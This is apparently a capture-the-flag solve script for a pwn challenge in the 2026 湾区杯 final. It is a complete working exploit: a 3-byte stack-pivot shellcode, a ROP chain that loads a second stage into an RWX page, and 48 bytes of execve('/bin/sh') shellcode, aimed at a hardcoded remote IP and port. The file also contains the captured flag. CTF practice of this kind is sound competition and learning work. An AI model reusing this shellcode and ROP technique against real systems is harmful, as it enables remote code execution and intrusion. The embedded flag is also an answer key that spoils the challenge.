#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
2026 湾区杯决赛 · 赛道二 · 环节二 pwn01  ——  3 字节 shellcode + 栈迁移 ROP（mmap RWX gift 泄漏）

qid  : B1zTXwTwwdInRsG9
flag : flag{0f7af5a5-8674-42f2-b25f-620cb36c0efc}

二进制: attachments/attachment  (ELF64, 16544 B, 未 strip)
        Partial RELRO / No canary / NX enabled / No PIE (0x400000) / SHSTK / IBT
        libc: attachments/libc-2.31.so

程序结构（实测符号表）:
    init()      0x401216  setbuf(stdin/stdout/stderr,NULL); alarm(0x78);
                          g_gift = mmap(0, 0x1000, PROT_RWX(7), MAP_PRIVATE|MAP_ANON(0x22), -1, 0);
                          printf("gift: %p.\n", g_gift);
    banner()    0x4012b4  puts(...); memset(name, 0, 0xf0);   read(0, name, 0x30);
                          ^ 全局 name = 0x4040e0，0x30 字节读进 0xf0 的缓冲区 —— 溢出
    shellcode() 0x401335  puts("Input your shellcode!");
                          read(0, g_gift, 3);       <-- 只允许 3 字节 shellcode
                          puts("The player start to play the shellcode game.");
                          write(1, name, 0x30);     <-- 此刻 rsi == name
                          call rdx (== g_gift);     <-- 直接跳进那 3 字节
    main()      0x4013f5  init() -> banner() -> shellcode()

利用（WP/卡片 19 路线，本脚本已本地 glibc 2.31 容器实测跑通）:
  1. 3 字节 shellcode = `56 5c c3` = push rsi; pop rsp; ret
     —— call g_gift 之前刚执行过 write(1, name, 0x30)，libc 里 rsi 仍是 name，
        于是 rsp := name，紧接着的 ret 从 name[0] 弹出"下一条执行地址"。
  2. name[0:8] = 0x401316（banner 里 `mov edx,0x30; rsi=name; edi=0; call read; pop rbp; ret`）
     —— 这个 call read 的返回地址正好压在被读的 name[0] 上；read 完成后 ret 跳到
        刚刚读进来的第 1 个 qword，且此时 rdx=0x30、rdi=0、rsp=name+8
        → 一个干净的"再读 48 字节新链"原语。
  3. 第二条链 = pop rdi; pop rsi; ret (0x4013c9) + 0 + G + read@plt (0x401120) + G
     → read(0, G, 0x30) 把 48 字节 shellcode 写进 RWX 页，然后 ret 直接跳到 G。
  4. 48 字节 shellcode = write(1, "PWNED!\\n", 7) + execve("/bin/sh", 0, 0)。
  5. 容器极简（无 cat / ls / id）→ 取 flag 必须用 dash 内建：read a < /flag; echo $a

用法:
    python solve.py
    python solve.py --host 127.0.0.1 --port 19996
"""
import argparse
import re
import socket
import struct
import sys
import time

DEFAULT_HOST = '60.205.230.76'      # 比赛期间原始地址（会随平台 reset 变化）
DEFAULT_PORT = 32851

# ---- 二进制（No PIE，固定地址 0x400000）----
R = 0x401316                        # banner+0x62: mov edx,0x30; lea rax,[rip]name; rsi; edi=0; call read; nop; pop rbp; ret
POP_RDI_RSI = 0x4013c9              # pop rdi; pop rsi; ret
READ_PLT = 0x401120
NAME = 0x4040E0                     # .bss 全局 name（0xf0 字节）
GIFT = 0x404098                     # 指向 mmap RWX 页的全局指针

PIVOT = b'\x56\x5c\xc3'             # push rsi; pop rsp; ret  （3 字节 shellcode）

# 恰好 48 字节：write(1, "PWNED!\n", 7) ; execve("/bin/sh", 0, 0)
SC = bytes.fromhex(
    '6a01' '5f'                             # push 1 ; pop rdi
    '48bb50574e45440a0000'                  # mov rbx, "PWNED!\n\0"
    '53' '4889e6'                           # push rbx ; mov rsi, rsp
    '6a07' '5a'                             # push 7 ; pop rdx
    '6a01' '58' '0f05'                      # push 1 ; pop rax ; syscall  -> write
    '31f6' '56'                             # xor esi, esi ; push rsi
    '48bb2f62696e2f736800'                  # mov rbx, "/bin/sh\0"
    '53' '54' '5f'                          # push rbx ; push rsp ; pop rdi
    '31d2' '6a3b' '58' '0f05'               # xor edx, edx ; push 59 ; pop rax ; syscall -> execve
)
assert len(SC) == 48, len(SC)

READFLAG = b'read a < /flag; echo $a\n'


def p64(x):
    return struct.pack('<Q', x)


class Tube(object):
    def __init__(self, host, port, timeout=15.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b''

    def send(self, data):
        self.s.sendall(data)

    def sendline(self, data):
        self.s.sendall(data + b'\n')

    def _fill(self, t):
        if t <= 0:
            return 0
        self.s.settimeout(t)
        try:
            c = self.s.recv(65536)
        except socket.timeout:
            return 0
        except OSError:
            return 0
        if c:
            self.buf += c
        return len(c)

    def recvuntil(self, marker, timeout=15.0):
        end = time.time() + timeout
        while marker not in self.buf:
            if self._fill(end - time.time()) == 0:
                break
        i = self.buf.find(marker)
        if i < 0:
            raise TimeoutError('等待 %r 超时；已收 %r' % (marker, self.buf[-300:]))
        i += len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def drain(self, t=2.0):
        self._fill(t)
        out, self.buf = self.buf, b''
        return out

    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


def exploit(host, port):
    t = Tube(host, port)
    print('[*] connected %s:%d' % (host, port))

    # ---- banner + gift 泄漏 ----
    head = t.recvuntil(b'.', timeout=15)
    m = re.search(rb'gift:\s*(0x[0-9a-fA-F]+)', head)
    if not m:
        raise ValueError('没拿到 gift 泄漏: %r' % head[-200:])
    gift = int(m.group(1), 16)
    print('[+] gift (RWX page) = %#x' % gift)
    t.recvuntil(b'Input your name to start!', timeout=15)
    t.recvuntil(b'> ', timeout=15)

    # ---- 一次性把 4 段输入全部推过去（各段长度与程序的三次 read 严格对齐）----
    # segment A: banner 的 read(0, name, 0x30) —— 恰好 0x30 字节
    #            name[0:8] = 0x401316（栈迁移 ret 的目标），其余填充
    # segment B: shellcode() 的 read(0, g_gift, 3) —— 恰好 3 字节
    #            56 5c c3 = push rsi; pop rsp; ret
    # segment C: 0x401316 的 call read(0, name, 0x30) 读到 name[0] —— 恰好 0x30 字节
    #            第 1 个 qword 就是 read 返回后 ret 的目标 = 真正的 ROP 链起点
    # segment D: read@plt(0, gift, 0x30) 读进 RWX 页的 48 字节 shellcode
    segA = p64(R).ljust(0x30, b'\x00')
    segB = PIVOT
    chain = (p64(POP_RDI_RSI) + p64(0) + p64(gift) + p64(READ_PLT) + p64(gift))
    segC = chain.ljust(0x30, b'\x00')
    segD = SC
    assert len(segA) == 0x30 and len(segB) == 3 and len(segC) == 0x30 and len(segD) == 48
    t.send(segA)
    time.sleep(0.3)
    t.send(segB)
    time.sleep(0.3)
    t.send(segC)
    time.sleep(0.3)
    t.send(segD)
    time.sleep(1.2)

    # ---- 取 flag（容器极简：无 cat/ls/id，只有 dash 内建）----
    t.sendline(b'echo __SHELL_OK__')
    time.sleep(0.3)
    out = t.drain(1.0)
    t.sendline(READFLAG)
    out += t.drain(6.0)
    text = out.decode('utf-8', 'replace')
    t.close()
    print('[+] shell 回显:\n%s' % text)
    m = re.search(r'flag\{[0-9a-zA-Z_\-]{6,}\}', text)
    return m.group(0) if m else None


def main():
    ap = argparse.ArgumentParser(description='湾区杯决赛 赛道二 环节二 pwn01 —— 3 字节 shellcode + 栈迁移')
    ap.add_argument('--host', default=DEFAULT_HOST, help='容器地址（reset 后会变）')
    ap.add_argument('--port', type=int, default=DEFAULT_PORT)
    ap.add_argument('--retries', type=int, default=3)
    args = ap.parse_args()

    for i in range(1, args.retries + 1):
        try:
            flag = exploit(args.host, args.port)
            if flag:
                print('\n[FLAG] %s' % flag)
                return 0
            print('[!] 第 %d 次未匹配到 flag' % i)
        except Exception as e:                                    # noqa: BLE001
            print('[!] 第 %d 次失败: %s: %s' % (i, type(e).__name__, e))
        time.sleep(1.2)
    print('[-] 未取得 flag')
    return 1


if __name__ == '__main__':
    sys.exit(main())
